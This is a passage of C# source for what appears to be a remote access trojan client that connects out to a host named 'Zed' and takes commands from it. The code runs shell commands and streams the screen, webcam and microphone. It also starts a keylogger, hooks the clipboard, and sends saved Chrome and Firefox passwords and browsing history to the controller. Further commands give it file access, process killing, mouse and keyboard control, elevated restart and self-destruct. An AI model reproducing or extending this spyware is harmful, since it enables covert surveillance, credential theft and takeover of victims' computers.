using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Threading;
using Microsoft.Win32;
using System.Net;
using NAudio.Wave;
using System.Data;
using System.Collections;
using System.Runtime.InteropServices;
using RemoteClient.Core;
using RemoteClient.Camera;
using RemoteClient.Browsers;

namespace RemoteClient
{
    public class RemoteClient
    {
        private DeviceNotification notifier;
        private ChatForm chatForm;
        private BinaryWriter bWrite;
        private bool olReceived, shot = false;
        private static NetworkStream ns;
        private static TcpClient server;
        private ActiveWindowTracker tracker;
        private TreeNode node;
        private bool isfile, arun = false;
        private Dispatcher dispatcher;
        private Thread realTimeTrackerThread;
        private Thread realTimeScreenShootThread;
        private Thread chatThread;
        private int screenShootUpdateTime = 100; //10 fps
        private int depth = 70;
        private WaveInEvent waveIn;
        private ClipHook hookboard;
        private Webcam webcam;

        private delegate void FoundInfoSyncHandler(FoundInfoEventArgs e);
        private FoundInfoSyncHandler FoundInfo;

        private delegate void ThreadEndedSyncHandler(ThreadEndedEventArgs e);
        private ThreadEndedSyncHandler ThreadEnded;  

        private void InitAudio(int dev)
        {
            try
            {
                waveIn = new WaveInEvent();
                waveIn.BufferMilliseconds = 50;
                waveIn.DeviceNumber = dev;
                waveIn.DataAvailable += new EventHandler<WaveInEventArgs>(waveIn_DataPresent);

                int[] bt = new int[3];
                bt[0] = waveIn.WaveFormat.SampleRate;
                bt[1] = waveIn.WaveFormat.Channels;
                bt[2] = waveIn.WaveFormat.BitsPerSample;

                SendMessage(new global::DataObject
                {
                    CommandType = "Mic",
                    CommandName = "provider",
                    CommandData = bt
                });
            }
            catch (Exception e)
            {
                LogError(e.ToString());
            }
        }

        bool distruct = false;
        private void CloseEveryThing()
        {
            try
            {
                if (waveIn != null)
                {
                    waveIn.StopRecording();
                    waveIn = null;
                }

                distruct = true;
                StopRunningThreads();
                server.Client.Disconnect(false);
            }
            catch(Exception e)
            {
                LogError(e.Message);
            }
        }

        private void waveIn_DataPresent(object sender, WaveInEventArgs e)
        {
            try
            {
                object[] obj = new object[2];
                obj[0] = e.Buffer;
                obj[1] = e.BytesRecorded;

                SendMessage(new global::DataObject
                {
                    CommandType = "Mic",
                    CommandName = "Update",
                    CommandData = obj
                });
            }
            catch (Exception ex)
            {
                LogError(ex.ToString());
            }
        }

        public RemoteClient()
        {
            

            this.FoundInfo += new FoundInfoSyncHandler(this_FoundInfo);
            this.ThreadEnded += new ThreadEndedSyncHandler(this_ThreadEnded);

            Searcher.FoundInfo += new Searcher.FoundInfoEventHandler(Searcher_FoundInfo);
            Searcher.ThreadEnded += new Searcher.ThreadEndedEventHandler(Searcher_ThreadEnded);

            Application.ApplicationExit += new EventHandler(agent_exit);

            dispatcher = Dispatcher.CurrentDispatcher;
            
            Thread t = new Thread(StartClient);
            t.SetApartmentState(ApartmentState.STA);
            t.Start();    
        }
        
        private void agent_exit(object sender, EventArgs e)
        {  
            SendMessage(new global::DataObject
            {
                CommandType = "Self",
                CommandName = "result",
                CommandData = "Remote Client is terminated Reason can be any thing!"
            });
        }

        private void StartClient()
        {
            while (true)
            {

                if (distruct)
                    break;

                while (true)
                {

                    if (distruct)
                        break;

                    try
                    {
                        server = new TcpClient(GetIpAddress(), 8080);
                        break;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                    //}
                    try
                    {
                        if (IsSocketConnected(server.Client))
                        {
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                    Thread.Sleep(1000);
                }

                ns = server.GetStream();

                StateObject state = new StateObject();
                state.workSocket = server.Client;
                server.Client.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
                    new AsyncCallback(OnReceive), state);

                while (true)
                {
                    try
                    {
                        if (!IsSocketConnected(server.Client))
                        {
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                        break;
                    }

                    Thread.Sleep(1000);
                }

                StopRunningThreads();
                ns.Close();
                server.Close();
            }
        }

        private string GetIpAddress()
        {
            IPHostEntry ie = Dns.GetHostByName("Zed");
            return ie.AddressList[0].ToString();
        }

        private void StopRunningThreads()
        {
            if (realTimeScreenShootThread != null)
            {
                realTimeScreenShootThread.Abort();
            }
            if (realTimeTrackerThread != null)
            {
                realTimeTrackerThread.Abort();
            }
        }

        private void Tracker()
        {
            tracker = new ActiveWindowTracker();
            arun = true;
            while (arun)
            {
                try
                {
                    tracker.WriteCurrentWindowInformation();
                }
                catch (Exception ex)
                {
                    LogError(ex.ToString());
                }
            }
        }

        private bool IsSocketConnected(Socket s)
        {
            bool part1 = s.Poll(1000, SelectMode.SelectRead);
            bool part2 = (s.Available == 0);
            if ((part1 && part2) || !s.Connected)
                return false;
            else
                return true;
        }

        private void Searcher_FoundInfo(FoundInfoEventArgs e)
        {
            this_FoundInfo(e);           
        }

        private void this_FoundInfo(FoundInfoEventArgs e)
        {
            // Create a new item in the results list:
            SendMessage(new global::DataObject {CommandType = "SRCH", CommandName = "FF", CommandData = e.Info});
        }

        private void Searcher_ThreadEnded(ThreadEndedEventArgs e)
        {
            this_ThreadEnded(e);
        }

        private void this_ThreadEnded(ThreadEndedEventArgs e)
        {
            // Show an error message if necessary:
            if (!e.Success)
            {
                SendMessage(new global::DataObject
                {
                    CommandType = "SRCH",
                    CommandName = "EEND",
                    CommandData = e.ErrorMsg
                });
            }
            else
            {
                SendMessage(new global::DataObject
                {
                    CommandType = "SRCH",
                    CommandName = "END",
                    CommandData = "Search Ended"
                });
            }
        }

        [STAThread]
        private void OnReceive(IAsyncResult ar)
        {
            String content = String.Empty;
            StateObject state = (StateObject) ar.AsyncState;
            Socket handler = state.workSocket;
            int bytesRead;

            if (handler.Connected)
            {
                
                // Read data from the client socket. 
                try
                {
                    bytesRead = handler.EndReceive(ar);
                    if (bytesRead > 0)
                    {
                        int bytesRemains = bytesRead;
                        int bytesProcess = 0;

                        while (bytesRemains > 0)
                        {
                            if (isfile)
                            {
                                if (state.fileSizeReceived < state.fileInfo.Length)
                                {
                                    byte[] buffer;
                                    long rl;
                                    if (bytesRemains > state.fileInfo.Length - state.fileSizeReceived)
                                    {
                                        rl = state.fileInfo.Length - state.fileSizeReceived;
                                    }
                                    else
                                    {
                                        rl = bytesRemains;
                                    }
                                    buffer = new byte[rl];
                                    try
                                    {
                                        Buffer.BlockCopy(state.buffer, bytesProcess, buffer, 0, (int) rl);
                                        bWrite.Write(state.buffer, 0, (int) rl);
                                    }
                                    catch (Exception ex)
                                    {
                                        Debug.WriteLine(ex);
                                    }

                                    bytesProcess += (int) rl;
                                    state.fileSizeReceived += (int) rl;
                                    bytesRemains = bytesRead - bytesProcess;

                                    if (state.fileSizeReceived == state.fileInfo.Length)
                                    {
                                        isfile = false;
                                        state.fileSizeReceived = 0;
                                        state.fileInfo = null;
                                        bWrite.Flush();
                                        bWrite.Close();
                                        bWrite.Dispose();
                                    }
                                }

                            }
                            else
                            {
                                if (!olReceived)
                                {
                                    byte[] temp = new byte[4];
                                    try
                                    {
                                        Buffer.BlockCopy(state.buffer, bytesProcess, temp, 0, 4);
                                    }
                                    catch (Exception ex)
                                    {
                                        Debug.WriteLine(ex.Message, "Error");
                                    }

                                    state.ol = BitConverter.ToInt32(temp, 0);
                                    olReceived = true;
                                    bytesProcess += 4;
                                    bytesRemains = bytesRead - bytesProcess;
                                }
                                else
                                {
                                    if (state.bab.Length < state.ol)
                                    {
                                        byte[] temp;
                                        int rl;
                                        if (bytesRemains > state.ol - state.bab.Length)
                                        {
                                            rl = state.ol - state.bab.Length;
                                        }
                                        else
                                        {
                                            rl = bytesRemains;
                                        }

                                        temp = new byte[rl];
                                        try
                                        {
                                            Buffer.BlockCopy(state.buffer, bytesProcess, temp, 0, rl);
                                        }
                                        catch (Exception ex)
                                        {
                                            Debug.WriteLine(ex.Message, "Error");
                                        }

                                        state.bab.Append(temp);
                                        bytesProcess += rl;
                                        bytesRemains = bytesRead - bytesProcess;
                                        if (state.bab.Length == state.ol)
                                        {
                                            try
                                            {
                                                var d = (global::DataObject) ByteArrayToObject(state.bab.ToArray());

                                                olReceived = false;
                                                state.bab.Clear();

                                                if (d.CommandType == "FILE")
                                                {
                                                    isfile = true;
                                                    state.fileInfo = (FileInfo) ((object[])d.CommandData)[1];
                                                    bWrite =
                                                        new BinaryWriter(File.Open(((object[])d.CommandData)[0] + "\\" + state.fileInfo.Name,
                                                            FileMode.Append));
                                                }
                                                else
                                                {
                                                    ProcessCommand(d);
                                                }

                                            }
                                            catch (Exception ex)
                                            {
                                                LogError(ex.Message);
                                            }
                                        }
                                    }
                                }
                            }
                        }

                        handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
                            new AsyncCallback(OnReceive), state);
                    }
                }

                catch (SocketException socketException)
                {
                    //WSAECONNRESET, the other side closed impolitely
                    if (socketException.ErrorCode == 10054 ||
                        ((socketException.ErrorCode != 10004) && (socketException.ErrorCode != 10053)))
                    {
                        // Complete the disconnect request.
                        handler.Close();
                        handler = null;
                    }
                }

                    // Eat up exception....Hmmmm I'm loving eat!!!
                catch (Exception exception)
                {
                    Console.WriteLine(exception.ToString());
                    handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
                        new AsyncCallback(OnReceive), state);
                }
            }
        }

        private void ProcessCommand(object ob)
        {
            var o = (global::DataObject) ob;
            if (o.CommandType == "CMD")
            {
                ExecuteCmd cmd = new ExecuteCmd();
                cmd.ExecuteCommandAsync(o.CommandName);
            }
            else if (o.CommandType == "SRCH")
            {
                if (o.CommandName == "START")
                {
                    Searcher.Start((SearcherParams) o.CommandData);
                }
                else if (o.CommandName == "STOP")
                {
                    Searcher.Stop();
                }
            }
            else if (o.CommandType == "TSKMGR")
            {
                if (o.CommandName == "UPD")
                {
                    SendMessage(new global::DataObject
                    {
                        CommandType = "TSKMGR",
                        CommandName = "PROC",
                        CommandData = LoadAllProcesses()
                    });
                }
                else if (o.CommandName == "KILL")
                {
                    Process.GetProcessById(((int) o.CommandData)).Kill();
                }
            }
            else if (o.CommandType == "RTL")
            {
                if (o.CommandName == "RTASTART")
                {
                    realTimeTrackerThread = new Thread(Tracker);
                    realTimeTrackerThread.Start();
                }
                else if (o.CommandName == "RTASTOP")
                {
                    arun = false;
                }
                else if (o.CommandName == "RTKLSTART")
                {
                    try
                    {
                        Program.InitHook();
                    }
                    catch(Exception ex)
                    {
                        LogError(ex.Message);
                    }
                }
                else if (o.CommandName == "RTKLSTOP")
                {
                    Program.Unhook();
                }
            }
            else if (o.CommandType == "EXPLORER")
            {
                if (o.CommandName == "LOAD")
                {
                    SendMessage(new global::DataObject
                    {
                        CommandType = "EXPLORER",
                        CommandName = "LOAD",
                        CommandData = GetTreeViewDirectory()
                    });
                }
                else if (o.CommandName == "GETSUBDIR")
                {
                    SendMessage(new global::DataObject
                    {
                        CommandType = "EXPLORER",
                        CommandName = "SUBNODE",
                        CommandData = Explorer(o.CommandData)
                    });
                }
                else if (o.CommandName == "GETFILES")
                {
                    SendMessage(new global::DataObject
                    {
                        CommandType = "EXPLORER",
                        CommandName = "FILES",
                        CommandData = FExpGetFiles(o.CommandData)
                    });
                }
                else if (o.CommandName == "DELFILE")
                {
                    SendMessage(new global::DataObject
                    {
                        CommandType = "EXPLORER",
                        CommandName = "DELFILE",
                        CommandData = DeleteFile(o.CommandData)
                    });
                }
                else if (o.CommandName == "OPENFILE")
                {
                    OpenFile(o.CommandData);
                }
                else if (o.CommandName == "DOWNLOADFILE")
                {
                    if (File.Exists((string) o.CommandData))
                    {
                        SendMessage(new global::DataObject
                        {
                            CommandType = "FILE",
                            CommandData = new FileInfo((string)o.CommandData)
                        });
                        SendFile((string)o.CommandData);
                    }
                }
            }
            else if (o.CommandType == "ScreenShoot")
            {
                if (o.CommandName == "Start")
                {
                    if (realTimeScreenShootThread == null)
                    {
                        screenShootUpdateTime = (int)o.CommandData;
                        realTimeScreenShootThread = new Thread(SendScreen);
                        shot = true;
                        realTimeScreenShootThread.Start();
                    }
                    else
                    {
                        shot = true;
                        if (!realTimeScreenShootThread.IsAlive)
                            realTimeScreenShootThread.Start();
                    }
                }
                else if(o.CommandName == "Stop")
                {
                    shot = false;
                }
            }
            else if (o.CommandType == "Chat")
            {
                if (o.CommandName == "Start")
                {
                    chatThread = new Thread(StartChat);
                    chatThread.SetApartmentState(ApartmentState.STA);
                    chatThread.Start();
                }
                else if (o.CommandName == "Stop")
                {
                    chatThread.Abort();
                }
                else if (o.CommandName == "Message")
                {
                    chatForm.SetChatText((string)o.CommandData);
                }
            }
            else if (o.CommandType == "Webcam")
            {
                if (o.CommandName == "List")
                {
                    SendMessage(new global::DataObject
                    {
                        CommandName = "List",
                        CommandType = "Webcam",
                        CommandData = GetAllWebcams()
                    });
                }
                else if (o.CommandName == "choose")
                {
                    SetCamera((int)o.CommandData);
                }
                else if (o.CommandName == "Start")
                {
                    if (webcam != null)
                    {
                        webcam.Start();
                    }
                }
                else if (o.CommandName == "Stop")
                {
                    if (webcam != null)
                    {
                        webcam.Stop();
                    }
                }
                else if (o.CommandName == "depth")
                {
                    depth = (int)o.CommandData;
                }
            }
            else if (o.CommandType == "MessageBox")
            {
                if (o.CommandName == "show")
                {
                    ShowMessage(o.CommandData);
                }
            }
            else if (o.CommandType == "Mic")
            {
                if (o.CommandName == "choose")
                    InitAudio((int)o.CommandData);
                else if (o.CommandName == "Start")
                    waveIn.StartRecording();
                else if (o.CommandName == "Stop")
                    waveIn.StopRecording();
                else if(o.CommandName=="List")
                {
                    SendMessage(new global::DataObject
                    {
                        CommandName = "List",
                        CommandType = "Mic",
                        CommandData = GetAllWaveInputs()
                    });
                }
            }
            else if (o.CommandType == "Browsers")
            {
                if (Browsers(o.CommandName))
                {
                    if(UrlOpener.OpenUrl(o.CommandName, (string)o.CommandData))
                    {
                        SendMessage(new global::DataObject
                        {
                            CommandName = "Information",
                            CommandType = "MessageBox",
                            CommandData = "URL Has been Successfully Launched!"
                        });
                    }
                    else
                    {
                        SendMessage(new global::DataObject
                        {
                            CommandName = "Error",
                            CommandType = "MessageBox",
                            CommandData = "Cannot Launch requested URL on Selected Browser!"
                        });
                    }
                }
            }
            else if (o.CommandType == "Self")
            {
                if (o.CommandName == "status")
                {
                    Status();
                }
                else if (o.CommandName == "Init")
                {
                    FirstRun first = new FirstRun(true);
                    first.SelfTest();
                }
                else if (o.CommandName == "restart")
                {
                    bool admin = (bool)o.CommandData;

                    if (admin)
                        ZedstronRemoteClient.UAC.RestartElevated();
                    else
                        ZedstronRemoteClient.UAC.Restart();
                }
                else if (o.CommandName == "destroy")
                {
                    bool hard = (bool)o.CommandData;
                    if (hard)
                    {
                        FirstRun fr = new FirstRun(true);
                        fr.SelfDestruct();
                        CloseEveryThing();
                    }
                    else
                    {
                        CloseEveryThing();
                    }
                }
            }
            else if (o.CommandType == "Clipboard")
            {
                if (o.CommandName == "clear")
                    ClipOperation(Clipboard.Clear,null);

                else if (o.CommandName == "fetch")
                {
                    if (hookboard != null)
                    {
                        ClipOperation(hookboard.CheckandSend, hookboard);
                    }
                }

                else if (o.CommandName == "state")
                    HookClipboard(o.CommandData);
            }
            else if (o.CommandType == "Device")
            {
                if (o.CommandName == "notify")
                    DeviceChangeHook(o.CommandData);
            }
            else if(o.CommandType == "Mouse")
            {
                MouseParser(o.CommandData, bool.Parse(o.CommandName));
            }
            else if (o.CommandType == "Keyboard")
            {
                if (o.CommandName == "send")
                {
                    issueKey(o.CommandData);
                }
            }
        }

        private void issueKey(object o)
        {
            try
            {
                SendKeys.Send((string)o);
            }
            catch(Exception e)
            {
                LogError(e.Message);
            }
        }

        private void ClipOperation(Action action, object obj)
        {
            Thread thread = new Thread(() => action.Method.Invoke(obj, null));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
            thread.Join();
        }

        private void HookClipboard(object p)
        {
            bool b = (bool)p;
            if (b)
            {
                hookboard = new ClipHook();
                hookboard.Hook();
            }
            else
            {
                if (hookboard != null)
                {
                    hookboard.UnHook();
                    hookboard = null;
                }
            }
        }

        private void Status()
        {
            FirstRun first = new FirstRun(true);
            SendMessage(new global::DataObject
            {
                CommandName = "result",
                CommandType = "Self",
                CommandData = first.Status()
            });
        }

        private bool Browsers(string tp)
        {
            bool flag = true;
            if (tp == "chistory")
            {
                flag = false;
                Chrome h = new Chrome();
                object d = h.FetchHistory();
                if (d != null)
                {
                    SendMessage(new global::DataObject
                    {
                        CommandName = "result",
                        CommandType = "Browsers",
                        CommandData = d
                    });
                }
                else
                {
                    LogError(h.Error());
                }
            }
            else if (tp == "list")
            {
                flag = false;
                SendMessage(new global::DataObject
                {
                    CommandName = "list",
                    CommandType = "Browsers",
                    CommandData = DetectBrowsers()
                });
            }
            else if (tp == "fhistory")
            {
                flag = false;
                try
                {
                    Firefox firefox = new Firefox();
                    DataTable dt=firefox.GetHistory();
                    if (dt != null)
                    {
                        SendMessage(new global::DataObject
                        {
                            CommandName = "result",
                            CommandType = "Browsers",
                            CommandData = dt
                        });
                    }
                }
                catch(Exception e)
                {
                    LogError(e.ToString());
                }
            }
            else if (tp == "ihistory")
            {
                flag = false;
                try
                {
                    InternetExplorer ie = new InternetExplorer();
                    DataTable dt = ie.GetHistory();
                    if (dt != null)
                    {
                        SendMessage(new global::DataObject
                        {
                            CommandName = "result",
                            CommandType = "Browsers",
                            CommandData = dt
                        });
                    }
                }
                catch (Exception e)
                {
                    LogError(e.ToString());
                }
            }
            else if (tp == "fclear")
            {
                flag = false;
                Firefox firefox = new Firefox();
                if (firefox.ClearHistory())
                {
                    SendMessage(new global::DataObject
                    {
                        CommandName = "Information",
                        CommandType = "MessageBox",
                        CommandData = "Firefox History has been Successfully Cleared!"
                    });
                }
                else
                {
                    SendMessage(new global::DataObject
                    {
                        CommandName = "Error",
                        CommandType = "MessageBox",
                        CommandData = "Error Occured while clearing the History!"
                    });
                }
            }
            else if (tp == "cpass")
            {
                flag = false;
                Chrome h = new Chrome();
                object d = h.FetchCredentials();
                if (d != null)
                {
                    SendMessage(new global::DataObject
                    {
                        CommandName = "result",
                        CommandType = "Browsers",
                        CommandData = d
                    });
                }
                else
                {
                    LogError(h.Error());
                }
            }
            else if (tp == "fpass")
            {
                flag = false;

                Firefox firefox = new Firefox();
                DataTable dt = firefox.FetchCredentials();

                if (dt != null)
                {
                    SendMessage(new global::DataObject
                    {
                        CommandName = "result",
                        CommandType = "Browsers",
                        CommandData = dt
                    });
                }
                else
                {
                    LogError(firefox.getError());
                }
            }

            return flag;
        }

        private string[] DetectBrowsers()
        {
            RegistryKey browserKeys;
            browserKeys = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\WOW6432Node\Clients\StartMenuInternet");
            if (browserKeys == null)
                browserKeys = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Clients\StartMenuInternet");

            return browserKeys.GetSubKeyNames();
        }

        private object GetAllWaveInputs()
        {
            try
            {
                string[] devices = new string[WaveIn.DeviceCount];

                for (int i = 0; i < devices.Length; i++)
                {
                    WaveInCapabilities cap = WaveIn.GetCapabilities(i);
                    devices[i] = cap.ProductName;
                }

                return devices;
            }
            catch(Exception e)
            {
                LogError(e.ToString());
                return new string[] { "Problem Occured!" };
            }
        }

        private void ShowMessage(object p)
        {
            try
            {
                string[] data = (string[])p;
                int times = int.Parse(data[1]);

                MessageBoxButtons btns = MessageBoxButtons.OK;
                if (data[2] == "Error" || data[2] == "Confirmation")
                    btns = MessageBoxButtons.YesNo;

                MessageBoxIcon ico = MessageBoxIcon.Information;
                if (data[2] == "Warning")
                    ico = MessageBoxIcon.Warning;
                else if (data[2] == "Confirmation")
                    ico = MessageBoxIcon.Question;
                else if (data[2] == "Error")
                    ico = MessageBoxIcon.Error;

                for (int i = 1; i <= times; i++)
                {
                    DialogResult rs = MessageBox.Show(data[0], data[2], btns, ico, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
                    SendMessage(new global::DataObject
                    {
                        CommandName = "Result",
                        CommandType = "MessageBox",
                        CommandData = rs.ToString()
                    });
                }
            }
            catch (Exception e)
            {
                LogError(e.Message);
            }
        }

        public static void LogError(string error)
        {
            error = DateTime.Now.ToShortTimeString() + " on " + DateTime.Today.ToShortDateString() + Environment.NewLine + error;
            error = "Exception raised at " + error;

            SendMessage(new global::DataObject
            {
                CommandType = "LogBook",
                CommandData = error
            });
        }

        private void SetCamera(int index)
        {
            try
            {
                if (webcam != null)
                {
                      webcam.setCamera(index);
                }
            }
            catch(Exception e)
            {
                LogError(e.Message);
            }
        }

        
        private object GetAllWebcams()
        {
            try
            {
                if (webcam == null)
                    webcam = new Webcam(depth);

                return webcam.Load().ToArray();
            }
            catch(Exception e)
            {
                LogError(e.ToString());
                return new string[] { "Error Occured!" };
            }
        }

        private void StartChat()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            chatForm = new ChatForm();
            Application.Run(chatForm);
        }

        private void SendScreen()
        {
            while (shot)
            {
                SendMessage(new global::DataObject
                {
                    CommandType = "ScreenShoot",
                    CommandName = "Update",
                    CommandData = ScreenShoot()
                });

                Thread.Sleep(screenShootUpdateTime);
            }
        }

        private object ScreenShoot()
        {
            try
            {
                var screen = Screen.PrimaryScreen;

                using (var bitmap = new Bitmap(screen.Bounds.Width, screen.Bounds.Height))
                using (var graphics = Graphics.FromImage(bitmap))
                {
                    graphics.CopyFromScreen(new Point(screen.Bounds.Left, screen.Bounds.Top), new Point(0, 0), screen.Bounds.Size);

                    Mouse.CURSORINFO pci;
                    pci.cbSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(Mouse.CURSORINFO));

                    if (Mouse.GetCursorInfo(out pci))
                    {
                        if (pci.flags == Mouse.CURSOR_SHOWING)
                        {
                            Mouse.DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
                            graphics.ReleaseHdc();
                        }
                    }

                    return Utility.Optimize(bitmap, depth);
                }
            }
            catch (Exception e)
            {
                LogError(e.Message);
                return null;
            }
        }

        private void OpenFile(object o)
        {
            Process p = new Process();
            ProcessStartInfo pi = new ProcessStartInfo();
            pi.UseShellExecute = true;
            pi.FileName = (string)o;
            p.StartInfo = pi;

            try
            {
                p.Start();
            }
            catch (Exception Ex)
            {
                LogError(Ex.ToString());
            }
        }
        private object DeleteFile(object o)
        {
            try
            {
                File.Delete((string)o);
                return new object[] { o, true };
            }
            catch (Exception ex)
            {
                LogError(ex.ToString());
                return new object[] { o, false };
            }
        }

        private Point Translate(Point point, Size from, Size to)
        {
            return new Point((point.X * to.Width) / from.Width, (point.Y * to.Height) / from.Height);
        }

        private void MouseParser(object obj, bool click)
        {
            try
            {
                if (!click)
                {
                    object[] o = (object[])obj;
                    Point p = Translate((Point)o[0], (Size)o[1], new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
                    Mouse.SetCursorPosition(p.X, p.Y);
                }
                else
                {
                    string tp = (string)obj;
                    if (tp == "rdown")
                        Mouse.MouseEvent(Mouse.MouseEventFlags.RightDown);
                    else if (tp == "rup")
                        Mouse.MouseEvent(Mouse.MouseEventFlags.RightUp);
                    else if (tp == "ldown")
                        Mouse.MouseEvent(Mouse.MouseEventFlags.LeftDown);
                    else if (tp == "lup")
                        Mouse.MouseEvent(Mouse.MouseEventFlags.LeftUp);
                }
            }
            catch (Exception e)
            {
                LogError(e.ToString());
            }
        }

        private object FExpGetFiles(object o)
        {
            try
            {
                string dirname = (string)o;

                string[] files = Directory.GetFiles(dirname);
                ImageList temp = new ImageList();
                Icon[] icon = new Icon[files.Length];
                ListViewItem[] lvi = new ListViewItem[files.Length];
                for (int i = 0; i < files.Length; i++)
                {
                    icon[i] = Icon.ExtractAssociatedIcon(files[i]);
                    FileInfo fi = new FileInfo(files[i]);
                    lvi[i] = new ListViewItem();
                    lvi[i].Text = fi.Name;
                    lvi[i].SubItems.Add(fi.Length.ToString(CultureInfo.InvariantCulture) + " Bytes");
                    lvi[i].SubItems.Add(GetFileType(fi.Extension));
                    lvi[i].ImageKey = i.ToString(CultureInfo.InvariantCulture);
                }


                return new object[] { lvi, icon };
            }
            catch (Exception e)
            {
                LogError(e.Message);
                return null;
            }
        }

        private string GetFileType(string ext)
        {
            RegistryKey rKey = null;
            RegistryKey sKey = null;
            string FileType = "";
            try
            {
                rKey = Registry.ClassesRoot;
                sKey = rKey.OpenSubKey(ext);
                if (sKey != null && (string)sKey.GetValue("", ext) != ext)
                {
                    sKey = rKey.OpenSubKey((string)sKey.GetValue("", ext));
                    FileType = (string)sKey.GetValue("");
                }
                else
                    FileType = ext.Substring(ext.LastIndexOf('.') + 1).ToUpper() + " File";
                return FileType;
            }
            catch (Exception e)
            {
                LogError(e.Message);
                return null;
            }
            finally
            {
                if (sKey != null) sKey.Close();
                if (rKey != null) rKey.Close();
            }
        }

        private object GetTreeViewDirectory()
        {
            try
            {
                TreeNode nodeD = new TreeNode();
                nodeD.Tag = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                nodeD.Text = "Desktop";
                nodeD.ImageKey = "Desktop";
                nodeD.SelectedImageKey = "Desktop";

                //TreeView.Nodes.Add(nodeD);

                //Add My Documents and Desktop folder outside
                TreeNode nodemydoc = new TreeNode();
                nodemydoc.Tag = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
                nodemydoc.Text = "My Documents";
                nodemydoc.ImageKey = "Document";
                nodemydoc.SelectedImageKey = "Document";
                nodeD.Nodes.Add(nodemydoc);
                GetFilesAndDir(nodemydoc);
                //MyComputer
                TreeNode nodemyComp = new TreeNode();
                nodemyComp.Tag = "My Computer";
                nodemyComp.Text = "My Computer";
                nodemyComp.ImageKey = "Computer";
                nodemyComp.SelectedImageKey = "Computer";
                nodeD.Nodes.Add(nodemyComp);
                GetDrives(nodemyComp);
                nodemyComp.EnsureVisible();
                //      TreeNodeMyComputer = nodemyComp;

                ExploreTreeNode(nodeD);
                return nodeD;
            }
            catch (Exception e)
            {
                LogError(e.Message);
                return null;
            }
        }

        private object Explorer(object o)
        {
            try
            {
                TreeNode node = (TreeNode)o;
                string[] drives = Environment.GetLogicalDrives();
                string dir2 = "";
                TreeNode n;
                TreeNode nodemyC;
                TreeNode nodeDrive;
                nodemyC = node;
                n = node;
                if (n.Text.IndexOf(":", 1) > 0)
                {
                    ExploreTreeNode(n);
                }
                else
                {
                    if ((String.Compare(n.Text, "Desktop") == 0) || String.Compare(n.Text, "My Computer") == 0)
                    {
                        if ((String.Compare(n.Text, "My Computer") == 0) && (nodemyC.GetNodeCount(true) < 2))
                        {
                            foreach (string drive in drives)
                            {
                                nodeDrive = new TreeNode();
                                nodeDrive.Tag = drive;
                                nodeDrive.Text = drive;
                                //Determine icon to display by drive
                                switch (Win32.GetDriveType(drive))
                                {
                                    case 2:
                                        nodeDrive.ImageIndex = 17;
                                        nodeDrive.SelectedImageIndex = 17;
                                        break;
                                    case 3:
                                        nodeDrive.ImageIndex = 0;
                                        nodeDrive.SelectedImageIndex = 0;
                                        break;
                                    case 4:
                                        nodeDrive.ImageIndex = 8;
                                        nodeDrive.SelectedImageIndex = 8;
                                        break;
                                    case 5:
                                        nodeDrive.ImageIndex = 7;
                                        nodeDrive.SelectedImageIndex = 7;
                                        break;
                                    default:
                                        nodeDrive.ImageIndex = 0;
                                        nodeDrive.SelectedImageIndex = 0;
                                        break;
                                }

                                nodemyC.Nodes.Add(nodeDrive);
                                nodeDrive.EnsureVisible();
                                //                   TreeView.Refresh();
                                //add dirs under drive
                                if (Directory.Exists(drive))
                                {
                                    foreach (string dir in Directory.GetDirectories(drive))
                                    {
                                        dir2 = dir;
                                        node = new TreeNode();
                                        node.Tag = dir;
                                        node.Text = dir.Substring(dir.LastIndexOf(@"\") + 1);
                                        node.ImageIndex = 1;
                                        nodeDrive.Nodes.Add(node);
                                    }
                                }
                                nodemyC.Expand();
                            }
                        }
                        else
                        {
                            ExploreTreeNode(n);
                        }
                    }
                    else
                    {
                        ExploreTreeNode(n);
                    }
                }

                return n;
            }
            catch (Exception e)
            {
                LogError(e.Message);
                return null;
            }
        }

        private void ExploreTreeNode(TreeNode n)
        {
            try
            {
                GetFilesAndDir(n);

                foreach (TreeNode node in n.Nodes)
                {
                    if (String.Compare(n.Text, "Desktop") == 0)
                    {
                        if ((String.Compare(node.Text, "My Documents") == 0) || (String.Compare(node.Text, "My Computer") == 0))
                        {
                        }
                        else
                        {
                            GetFilesAndDir(node);
                        }
                    }
                    else
                    {
                        GetFilesAndDir(node);
                    }
                }
            }
            catch(Exception ex)
            {
                LogError(ex.ToString());
            }
        }

        private void GetDrives(TreeNode myComputer)
        {
            try
            {
                foreach (var drive in Environment.GetLogicalDrives())
                {
                    TreeNode myDrive = new TreeNode(drive.Remove(2, 1));
                    myDrive.Tag = drive;
                    myDrive.ImageKey = "Drive";
                    myDrive.SelectedImageKey = "Drive";

                    myComputer.Nodes.Add(myDrive);
                }
            }
            catch (Exception ex)
            {
                LogError(ex.ToString());
            }
        }

        private bool GetSubDirectories(TreeNode parentNode)
        {
            try
            {
                string[] dirList;
                if (Directory.Exists(parentNode.Tag.ToString()))
                {
                    try
                    {
                        dirList = Directory.GetDirectories(parentNode.Tag.ToString());
                    }
                    catch
                    {
                        dirList = null;
                    }

                    if (dirList != null)
                    {
                        Array.Sort(dirList);
                        if (dirList.Length == parentNode.Nodes.Count)
                            return false;

                        for (int i = 0; i < dirList.Length; i++)
                        {
                            node = new TreeNode();
                            node.Tag = dirList[i];
